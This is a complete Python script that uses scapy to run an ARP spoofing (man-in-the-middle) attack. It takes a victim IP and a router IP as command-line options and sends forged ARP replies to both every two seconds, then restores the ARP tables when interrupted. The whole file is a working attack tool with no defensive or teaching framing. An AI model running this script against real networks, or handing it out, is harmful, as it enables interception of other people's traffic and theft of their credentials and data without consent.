#!/usr/bin/env python

import scapy.all as scapy
import time
import optparse
import sys


class Arpspoofer:
    def __init__(self):
        self.ip_victim = self.parse_victim_and_router_ip().victim_ip
        self.ip_router = self.parse_victim_and_router_ip().router_ip
        print(self.mac_reader(self.parse_victim_and_router_ip().victim_ip))

    def parse_victim_and_router_ip(self):
        parser = optparse.OptionParser()
        parser.add_option("-v", "--victim_ip", dest="victim_ip", help="[+]Enter the ip of victim")
        parser.add_option("-r", "--router_ip", dest="router_ip", help="[+]Enter the ip of router")
        (value, arg) = parser.parse_args()
        return value

    def mac_reader(sef, ip):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        mac = answered_list[0][1].hwsrc
        return mac

    def packet_sender(self, ip_victim, ip_src):
        mac_victim = self.mac_reader(ip_victim)
        packet = scapy.ARP(op=2, pdst=ip_victim, hwdst=mac_victim, psrc=ip_src)
        scapy.send(packet, verbose=False)

    def restore(self, ip_victim, ip_router):
        mac_victim = self.mac_reader(ip_victim)
        mac_router = self.mac_reader(ip_router)
        packet = scapy.ARP(op=2, pdst=ip_victim, hwdst=mac_victim, psrc=ip_router, hwsrc=mac_router)
        scapy.send(packet, count=4, verbose=False)

    def run(self):
        packets_count = 0
        try:
            while True:
                self.packet_sender(self.ip_victim, self.ip_router)
                self.packet_sender(self.ip_router, self.ip_victim)
                packets_count += 2
                print("\r[+]Packets sent :" + str(packets_count)),
                sys.stdout.flush()
                time.sleep(2)
        except KeyboardInterrupt:
            self.stop()

    def stop(self):
        print("\n[+]Detected ctrl + C.....Quitting")
        self.restore(self.ip_victim, self.ip_router)
        self.restore(self.ip_router, self.ip_victim)
        print("[+]Restored")


my_spoofer = Arpspoofer()
my_spoofer.run()
